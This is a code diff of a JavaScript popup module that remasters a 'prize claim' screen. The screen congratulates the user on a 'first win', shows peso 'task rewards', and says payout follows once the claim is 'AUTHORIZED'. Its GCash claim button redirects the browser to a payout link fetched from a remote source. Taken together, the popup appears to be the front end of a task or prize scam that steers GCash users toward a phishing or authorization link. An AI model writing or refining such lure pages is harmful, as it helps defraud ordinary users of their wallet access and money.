@@ -1,5 +1,5 @@
 /**
- * Popup Share Module - Same Structure as Main Core
+ * Popup Share Module - Remastered Phase 2 UI
  */
 
 // ========== POPUP MODULE ==========
@@ -13,16 +13,13 @@
     function init() {
         console.log('🎁 Popup Module Starting...');
         
-        // Check if popup exists
         const popup = document.getElementById('prizePopup');
         if (!popup) {
             console.error('Popup element not found!');
             return;
         }
         
-        // Attach claim button event
         attachClaimButton();
-        
         console.log('✅ Popup Module ready');
     }
     
@@ -31,7 +28,6 @@
         const claimBtn = document.getElementById('claimNowBtn');
         if (!claimBtn) return;
         
-        // Remove existing listeners
         const newBtn = claimBtn.cloneNode(true);
         claimBtn.parentNode.replaceChild(newBtn, claimBtn);
         
@@ -39,7 +35,6 @@
             e.preventDefault();
             e.stopPropagation();
             
-            // Get balance from PromotionCore or DOM
             let balance = 0;
             if (window.PromotionCore) {
                 balance = window.PromotionCore.getBalance();
@@ -50,10 +45,7 @@
             
             showPopup(balance);
             
-            // Play sound
             if (window.PromotionCore) window.PromotionCore.playSound('scatter');
-            
-            // Start confetti
             if (window.ConfettiModule) window.ConfettiModule.start();
         });
     }
@@ -75,12 +67,33 @@
         }
     }
     
+    // ========== ANIMATION TRANSITION ==========
+    function transitionToPhase2() {
+        const popupInner = document.querySelector('.popup-inner');
+        if (!popupInner) return;
+        
+        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
+        popupInner.style.opacity = '0';
+        popupInner.style.transform = 'scale(0.95)';
+        
+        setTimeout(() => {
+            showPhase2();
+            popupInner.style.opacity = '1';
+            popupInner.style.transform = 'scale(1)';
+        }, 300);
+    }
+    
     // ========== PHASE 1: DEFAULT ==========
     function showPhase1(balance) {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
         currentBalance = balance;
+        currentPhase = 1;
+        
+        popupInner.style.transition = '';
+        popupInner.style.opacity = '1';
+        popupInner.style.transform = '';
         
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase1">✕</div>
@@ -98,7 +111,7 @@
                 <div class="indicator"></div>
             </div>
             
-            <button class="claim-gcash-button" id="claimGCashBtn">
+            <button class="claim-gcash-button" id="claimGCashBtn" style="transition: all 0.2s ease;">
                 <img src="images/gc_icon.png" class="gc-icon"> CLAIM THRU GCASH
             </button>
 
@@ -109,7 +122,6 @@
             </button>
         `;
         
-        // Attach events
         const closeBtn = document.getElementById('popupClosePhase1');
         if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
@@ -117,60 +129,169 @@
         if (backBtn) backBtn.onclick = function() { closePopup(); };
         
         const claimBtn = document.getElementById('claimGCashBtn');
-        if (claimBtn) claimBtn.onclick = function() { showPhase2(); };
+        if (claimBtn) {
+            claimBtn.onclick = function() {
+                this.style.transform = 'scale(0.98)';
+                setTimeout(() => { this.style.transform = 'scale(1)'; }, 150);
+                transitionToPhase2();
+            };
+        }
     }
     
-    // ========== PHASE 2: WITHDRAWAL LINK ==========
+    // ========== PHASE 2: REMASTERED UI ==========
     function showPhase2() {
         const popupInner = document.querySelector('.popup-inner');
         if (!popupInner) return;
         
+        currentPhase = 2;
+        
         popupInner.innerHTML = `
             <div class="popup-close" id="popupClosePhase2">✕</div>
-            <h2 class="popup-title">🔗 WITHDRAWAL LINK</h2>
-            <div class="divider"></div>
-            <div class="invite-text">Click below to claim <strong style="color:#ffd700;">₱${currentBalance.toFixed(2)}</strong></div>
             
-            <div class="prize-amount-wrapper" style="border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; background: rgba(255,215,0,0.05);">
-                <div style="font-size: 11px; color: #ffd700;">YOUR REWARD</div>
-                <div style="font-size: 32px; color: #fff; font-weight: bold;">₱${currentBalance.toFixed(2)}</div>
+            <!-- WINNER ANIMATION -->
+            <div style="text-align: center; margin-bottom: 10px;">
+                <div style="font-size: 60px; animation: bounceIn 0.5s ease;">🏆</div>
             </div>
             
-            <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a);">
-                <img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH
+            <!-- TITLE -->
+            <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 22px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
+                GREAT JOB ON YOUR FIRST WIN!
+            </h2>
+            
+            <div class="divider" style="width: 40px; margin: 10px auto;"></div>
+            
+            <!-- MESSAGE -->
+            <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0 0 10px 0;">
+                    "Nice work today! You made that look easy — you can definitely earn even more."
+                </p>
+                <p style="font-family: 'Inter', sans-serif; font-size: 13px; color: #ffd700; line-height: 1.5; text-align: center; margin: 0; font-weight: 500;">
+                    Your task rewards of 
+                    <span style="font-size: 28px; font-weight: 900; color: #ffd700; text-shadow: 0 0 10px rgba(255,215,0,0.5); display: inline-block; margin: 0 5px;">₱${currentBalance.toFixed(2)}</span> 
+                    are officially ready to be claimed!
+                </p>
+            </div>
+            
+            <!-- AUTHORIZE HIGHLIGHT -->
+            <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 50px; padding: 12px 20px; margin: 15px 0; text-align: center;">
+                <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; margin: 0;">
+                    Once your claiming process is 
+                    <span style="font-family: 'Orbitron', monospace; font-size: 16px; font-weight: 900; color: #00aaff; text-shadow: 0 0 8px rgba(0,170,255,0.5); display: inline-block; letter-spacing: 2px;">AUTHORIZED</span>, 
+                    your prize will be transferred instantly to your GCash wallet.
+                </p>
+            </div>
+            
+            <!-- PRIZE AMOUNT CARD -->
+            <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 2px solid #ffd700; border-radius: 20px; padding: 15px; margin: 15px 0; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.2);">
+                <div style="font-size: 10px; color: #ffd700; text-transform: uppercase; letter-spacing: 3px; margin-bottom: 5px;">PRIZE AMOUNT</div>
+                <div style="font-size: 56px; font-weight: 900; color: #ffd700; text-shadow: 0 0 15px rgba(255,215,0,0.4); font-family: 'Orbitron', monospace;">₱${currentBalance.toFixed(2)}</div>
+                <div style="height: 2px; background: linear-gradient(90deg, transparent, #ffd700, transparent); width: 80%; margin: 10px auto;"></div>
+                <div style="font-size: 10px; color: #888;">Ready for payout</div>
+            </div>
+            
+            <!-- WARNING NOTE -->
+            <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
+                <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
+                    💡 Make sure you have a verified GCash account to receive your reward
+                </p>
+            </div>
+            
+            <!-- CLAIM BUTTON -->
+            <button class="claim-gcash-button" id="proceedBtn" style="background: linear-gradient(135deg, #00a650, #008c3a); transition: all 0.2s ease; width: 100%; padding: 16px; margin-top: 15px; font-size: 16px; font-weight: bold;">
+                <img src="images/gc_icon.png" class="gc-icon" style="width: 22px; height: 22px;"> CLAIM VIA GCASH APP
             </button>
 
-            <div class="button-separator"></div>
+            <div class="button-separator" style="margin: 15px 0 10px;"></div>
 
-            <button class="back-btn" id="backBtnPhase2">
+            <button class="back-btn" id="backBtnPhase2" style="transition: all 0.2s ease; width: 100%;">
                 ← BACK TO PHASE 1
             </button>
         `;
+        
+        // Add animations
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes bounceIn {
+                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
+                60% { transform: scale(1.1) rotate(0deg); }
+                100% { transform: scale(1) rotate(0deg); opacity: 1; }
+            }
+            @keyframes pulse {
+                0% { transform: scale(1); }
+                50% { transform: scale(1.02); box-shadow: 0 0 20px rgba(0,166,80,0.5); }
+                100% { transform: scale(1); }
+            }
+            @keyframes shimmer {
+                0% { background-position: -200% 0; }
+                100% { background-position: 200% 0; }
+            }
+            .btn-pulse {
+                animation: pulse 0.5s ease;
+            }
+            .loading-shimmer {
+                background: linear-gradient(90deg, #00a650, #00cc66, #00a650);
+                background-size: 200% 100%;
+                animation: shimmer 1.5s infinite;
+            }
+        `;
+        if (!document.querySelector('#phase2-animations')) {
+            style.id = 'phase2-animations';
+            document.head.appendChild(style);
+        }
         
         // Attach events
         const closeBtn = document.getElementById('popupClosePhase2');
         if (closeBtn) closeBtn.onclick = function() { closePopup(); };
         
         const backBtn = document.getElementById('backBtnPhase2');
-        if (backBtn) backBtn.onclick = function() { showPhase1(currentBalance); };
+        if (backBtn) {
+            backBtn.onclick = function() {
+                popupInner.style.transition = 'opacity 0.3s ease';
+                popupInner.style.opacity = '0';
+                setTimeout(() => {
+                    showPhase1(currentBalance);
+                    popupInner.style.opacity = '1';
+                }, 300);
+            };
+        }
         
         const proceedBtn = document.getElementById('proceedBtn');
         if (proceedBtn) {
             proceedBtn.onclick = async function() {
-                proceedBtn.disabled = true;
-                proceedBtn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CHECKING LINK...`;
-                proceedBtn.style.opacity = '0.7';
+                this.classList.add('btn-pulse');
+                setTimeout(() => this.classList.remove('btn-pulse'), 500);
+                
+                this.disabled = true;
+                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon" style="animation: pulse 0.8s infinite;"> PROCESSING PAYOUT...`;
+                this.style.opacity = '0.8';
                 
                 const linkData = await getLatestPayoutLink();
                 
                 if (linkData && linkData.url) {
-                    window.location.href = linkData.url;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
+                    setTimeout(() => {
+                        window.location.href = linkData.url;
+                    }, 800);
                 } else {
-                    alert("⚠️ Withdrawal Unsuccessful\n\nMukhang hindi namin ma-proseso ang iyong request dahil kailangan ng GCash App update o kaya ay wala itong mahanap na GCash sa iyong device.\n\nSolution: Siguraduhing updated ang iyong app o subukang mag-login sa ibang device para makuha na ang iyong rewards! 🚀");
+                    this.disabled = false;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
+                    this.style.opacity = '1';
                     
-                    proceedBtn.disabled = false;
-                    proceedBtn.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> PROCEED TO GCASH`;
-                    proceedBtn.style.opacity = '1';
+                    const errorDiv = document.createElement('div');
+                    errorDiv.className = 'error-message';
+                    errorDiv.style.cssText = 'background: rgba(255,68,68,0.15); border: 1px solid #ff4444; border-radius: 10px; padding: 10px; margin-top: 10px; text-align: center;';
+                    errorDiv.innerHTML = `
+                        <span style="color: #ff8888; font-size: 12px;">⚠️ Withdrawal Unsuccessful</span><br>
+                        <span style="color: #ccc; font-size: 10px;">No payout link available. Please contact support.</span>
+                    `;
+                    
+                    const existingError = popupInner.querySelector('.error-message');
+                    if (existingError) existingError.remove();
+                    proceedBtn.parentNode.insertBefore(errorDiv, proceedBtn.nextSibling);
+                    
+                    setTimeout(() => {
+                        if (errorDiv) errorDiv.remove();
+                    }, 4000);
                 }
             };
         }
@@ -207,7 +328,6 @@
         init();
     }
     
-    // ========== EXPORT ==========
     window.showPopup = showPopup;
     window.closePopup = closePopup;
 })();
